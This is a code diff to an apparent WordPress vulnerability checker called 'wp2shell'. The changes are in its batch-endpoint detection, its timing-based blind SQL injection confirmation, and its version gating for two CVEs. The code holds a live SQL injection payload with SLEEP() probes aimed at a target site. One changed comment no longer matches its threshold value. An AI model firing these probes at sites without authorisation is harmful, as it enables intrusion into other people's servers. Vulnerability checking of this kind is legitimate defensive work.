@@ -315,15 +315,21 @@ class BatchClient:
     def _detect_endpoint(self) -> str:
         """Find working batch endpoint (pretty URL or rest_route fallback)."""
         # Try pretty URL first
-        resp = self.http.post("/wp-json/batch/v1", {"requests": []})
-        if resp.status == 207:
-            return "/wp-json/batch/v1"
+        try:
+            resp = self.http.post("/wp-json/batch/v1", {"requests": []})
+            if resp.status == 207:
+                return "/wp-json/batch/v1"
+        except TargetError:
+            pass  # server may not have batch endpoint at all
         # Fall back to rest_route
-        resp2 = self.http.post("/index.php?rest_route=/batch/v1", {"requests": []})
-        if resp2.status == 207:
-            return "/index.php?rest_route=/batch/v1"
-        # Return pretty URL anyway
-        return "/wp-json/batch/v1"
+        try:
+            resp2 = self.http.post("/index.php?rest_route=/batch/v1", {"requests": []})
+            if resp2.status == 207:
+                return "/index.php?rest_route=/batch/v1"
+        except TargetError:
+            pass
+        # Batch endpoint not available
+        raise TargetError("batch/v1 endpoint not available on this target")
 
     @property
     def endpoint(self) -> str:
@@ -426,15 +432,20 @@ class BlindSQLi:
         return self.client.inject(f"0) OR {sql}-- -").elapsed
 
     def confirm_timing(self, samples: int = 3) -> TimingResult:
-        pairs = [(self._elapsed("SLEEP(0)"), self._elapsed(f"SLEEP({self.sleep:g})"))
-                 for _ in range(samples)]
+        pairs = []
+        for i in range(samples):
+            b = self._elapsed("SLEEP(0)")
+            d = self._elapsed(f"SLEEP({self.sleep:g})")
+            pairs.append((b, d))
+            info(f"Round {i+1}: baseline={b:.3f}s  delayed={d:.3f}s  delta={d-b:.3f}s")
         baselines = [p[0] for p in pairs]
         delays = [p[1] for p in pairs]
         deltas = [d - b for b, d in pairs]
         bl_m = statistics.median(baselines)
         dl_m = statistics.median(delays)
         dt_m = statistics.median(deltas)
-        th = max(0.75, self.sleep * 0.65)
+        # Adaptive threshold: 65% of sleep or 0.5s, whichever is larger
+        th = max(0.5, self.sleep * 0.5)
         return TimingResult(dt_m >= th, bl_m, dl_m, dt_m, th, samples=pairs)
 
     def confirm(self) -> Tuple[bool, float, float]:
@@ -490,13 +501,42 @@ def cmd_check(target: str, args) -> dict:
         if ver["affected"]:
             fail(f"VERSION IN AFFECTED RANGE (CVE-2026-63030 + CVE-2026-60137)")
         else:
-            ok(f"Version {ver['version']} is not in affected range")
+            ok(f"Version {ver['version']} is not in affected range — skipping confusion/SQLi checks")
+            results["route_confusion"] = {"detected": False, "reason": f"Version {ver['version']} not in affected range"}
+            results["sqli"] = {"confirmed": False, "reason": "Version not affected"}
+            section("VERDICT")
+            print(f"\n  {G}[SAFE]{RST} WordPress {ver['version']} is not in the wp2shell affected range\n")
+            return results
     else:
         warn("Could not detect WordPress version")
 
+    # Check if target is too old for batch API (added in WP 5.6)
+    wp_ver = ver.get("version", "")
+    try:
+        parts = tuple(int(x) for x in wp_ver.split(".")[:2]) if wp_ver else ()
+    except Exception:
+        parts = ()
+    if parts and parts < (5, 6):
+        warn(f"WordPress {wp_ver} is pre-5.6 — no batch/v1 endpoint, skipping confusion/SQLi checks")
+        results["route_confusion"] = {"detected": False, "reason": f"WP {wp_ver} < 5.6, no batch API"}
+        results["sqli"] = {"confirmed": False, "reason": "WP too old for batch API"}
+        section("VERDICT")
+        print(f"\n  {G}[SAFE]{RST} WordPress {wp_ver} — too old for wp2shell (batch API added in 5.6)\n")
+        return results
+
     section("Route confusion check")
-    bc = BatchClient(target, timeout=args.timeout, proxy=args.proxy, ua=args.ua, debug=args.debug)
-    info(f"Using batch endpoint: {bc.endpoint}")
+    try:
+        bc = BatchClient(target, timeout=args.timeout, proxy=args.proxy, ua=args.ua, debug=args.debug)
+        ep = bc.endpoint  # may raise TargetError if batch not available
+        info(f"Using batch endpoint: {ep}")
+    except TargetError as e:
+        fail(f"Batch endpoint unavailable: {e}")
+        results["route_confusion"] = {"detected": False, "error": str(e)}
+        results["sqli"] = {"confirmed": False, "reason": "Batch endpoint not reachable"}
+        section("VERDICT")
+        print(f"\n  {G}[SAFE]{RST} Batch API not available on this target\n")
+        return results
+
     try:
         resp = bc.marker_probe()
         codes = bc.batch_marker_codes(resp)
@@ -525,7 +565,8 @@ def cmd_check(target: str, args) -> dict:
         if timing.confirmed:
             ok(f"BLIND SQL INJECTION CONFIRMED")
         else:
-            fail(f"SQL injection NOT confirmed")
+            fail(f"SQL injection NOT confirmed (delta={timing.delta:.3f}s < threshold={timing.threshold:.3f}s)")
+            warn("Try: --sleep 5 --rounds 5  (increase delay and samples for noisy networks)")
     except TargetError as e:
         fail(f"Connection error: {e}")
         results["sqli"] = {"confirmed": False, "error": str(e)}
